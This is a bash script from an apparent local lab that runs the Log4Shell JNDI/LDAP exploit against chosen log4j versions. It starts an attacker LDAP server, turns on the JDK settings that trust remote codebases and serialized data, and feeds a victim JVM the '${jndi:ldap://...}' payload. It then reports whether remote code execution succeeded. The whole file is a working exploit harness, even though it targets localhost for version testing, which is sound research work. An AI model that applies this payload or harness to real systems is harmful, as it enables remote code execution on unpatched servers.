#!/usr/bin/env bash
# Runs the attack against one log4j version.
#   ./run.sh <log4j-version> <codebase|classpath|serialized> [log|ctx] [extra-jvm-props]
#
# codebase  : LDAP entry carries a javaFactory reference; the factory class is pulled from
#             the attacker HTTP server (remote code load)
# classpath : same, but the factory class is already on the victim classpath
# serialized: LDAP entry carries javaSerializedData (JDK deserialization path)
# log|ctx   : victim logs the payload as a message, or through the Thread Context Map
set -euo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
LIB="$ROOT/lib"
OUT="$ROOT/lab/build"
VER="${1:-2.14.1}"
MODE="${2:-codebase}"
VICTIM="${3:-log}"
EXTRA_PROPS="${4:-}"
JDK="${JDK:-/usr/lib/jvm/java-8-openjdk-amd64}"
JAVA="$JDK/bin/java"
PROOF=/tmp/log4j-lab-pwned.txt
VICTIM_LOG=/tmp/log4j-lab-victim.log
ATTACKER_LOG=/tmp/log4j-lab-attacker.log
# trustURLCodebase lets the JDK load the payload class from the attacker codebase;
# trustSerialData lets the JDK deserialize javaSerializedData. Both are default-off on
# modern JDKs but still re-enableable - see analysis/jdksrc.
LOG4J_PROPS="${LOG4J_PROPS--Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Dcom.sun.jndi.ldap.object.trustSerialData=true}"
PAYLOAD='${jndi:ldap://127.0.0.1:1389/cn=exploit,dc=example,dc=com}'

[ -d "$OUT" ] || { echo "run lab/build.sh first"; exit 1; }

VICTIM_CP="$OUT/victim.jar:$LIB/log4j-api-$VER.jar:$LIB/log4j-core-$VER.jar"
[ "$MODE" != "codebase" ] && VICTIM_CP="$VICTIM_CP:$OUT/payload.jar"
[ "$MODE" = "serialized" ] && VICTIM_CP="$VICTIM_CP:$OUT/payload.jar"

if [ "$VICTIM" = "ctx" ]; then
    VICTIM_CLASS=lab.VictimCtx
    VICTIM_PROPS="-Dlog4j.configurationFile=log4j2-ctx.xml"
elif [ "$VICTIM" = "reload" ]; then
    VICTIM_CLASS=lab.VictimReload
    VICTIM_PROPS="-Dlog4j.configurationFile=log4j2-ctx.xml"
elif [ "$VICTIM" = "lookups" ]; then
    VICTIM_CLASS=lab.Victim
    VICTIM_PROPS="-Dlog4j.configurationFile=log4j2-lookups.xml"
else
    VICTIM_CLASS=lab.Victim
    VICTIM_PROPS=""
fi

rm -f "$PROOF"
"$JAVA" ${ATTACKER_PROPS:-} -cp "$OUT/attacker.jar:$LIB/unboundid-ldapsdk-6.0.11.jar:$LIB/slf4j-api-1.7.36.jar:$LIB/slf4j-nop-1.7.36.jar" \
    -Dlab.mode="$MODE" lab.Attacker >"$ATTACKER_LOG" 2>&1 &
ATTACKER=$!
trap 'kill $ATTACKER 2>/dev/null || true' EXIT
sleep 1.2

set +e
"$JAVA" $LOG4J_PROPS $EXTRA_PROPS $VICTIM_PROPS -Dlab.cmd='id' -cp "$VICTIM_CP" "$VICTIM_CLASS" \
    "$PAYLOAD" >"$VICTIM_LOG" 2>&1
set -e
sleep 0.3

if [ -f "$PROOF" ]; then
    echo "RESULT log4j-core $VER mode=$MODE victim=$VICTIM props='${EXTRA_PROPS:-none}': RCE"
    [ "${VERBOSE:-0}" = "1" ] && sed 's/^/    /' "$VICTIM_LOG"
else
    echo "RESULT log4j-core $VER mode=$MODE victim=$VICTIM props='${EXTRA_PROPS:-none}': blocked"
    grep -m1 -o 'Error looking up JNDI resource.*' "$VICTIM_LOG" | sed 's/^/    /' || true
    grep -m1 -o 'JNDI must be enabled[^"]*' "$VICTIM_LOG" | sed 's/^/    /' || true
fi

exit 0
